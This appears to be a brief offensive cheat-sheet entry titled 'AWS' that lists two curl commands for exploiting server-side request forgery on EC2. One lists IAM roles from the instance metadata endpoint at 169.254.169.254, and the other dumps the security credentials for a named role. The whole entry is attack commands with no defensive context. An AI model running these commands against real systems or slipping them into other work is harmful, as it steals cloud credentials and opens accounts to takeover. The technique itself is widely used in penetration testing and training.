# AWS

% aws

## SSRF in EC2 - List roles
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## SSRF in EC2 - Dump roles
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```

